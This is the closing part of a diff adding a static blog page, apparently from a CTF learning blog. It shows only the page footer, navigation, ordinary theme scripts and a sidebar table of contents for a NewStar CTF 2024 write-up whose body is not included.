+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20241211205247446.png" alt="image-20241211205247446"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+             <a href="/tags/WP/" <i class="fa fa-tag"></i> WP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/02/%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA---%E4%B8%80%E6%AD%A5%E5%88%B0%E4%BD%8D/" rel="prev" title="图床搭建--联动Typro">
+      <i class="fa fa-chevron-left"></i> 图床搭建--联动Typro
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/12/12/%E9%87%91%E7%9B%BE%E7%BA%BF%E4%B8%8B--%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/" rel="next" title="数据泄露">
+      数据泄露 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NewStar-CTF-2024"><span class="nav-number">1.</span> <span class="nav-text">NewStar CTF 2024</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%9A%E8%B5%A2%E5%90%97"><span class="nav-number">1.2.1.</span> <span class="nav-text">会赢吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">1.2.3.</span> <span class="nav-text">备份文件泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI"><span class="nav-number">1.2.4.</span> <span class="nav-text">SSTI</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81"><span class="nav-number">1.3.</span> <span class="nav-text">密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RSA"><span class="nav-number">1.3.1.</span> <span class="nav-text">RSA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86"><span class="nav-number">1.4.1.</span> <span class="nav-text">php混淆加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90"><span class="nav-number">1.4.2.</span> <span class="nav-text">内存分析</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="CTF-DUAN"
+      src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/logo.jpg">
+  <p class="site-author-name" itemprop="name">CTF-DUAN</p>
+  <div class="site-description" itemprop="description">CTF学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CTF-DUAN</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>  -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
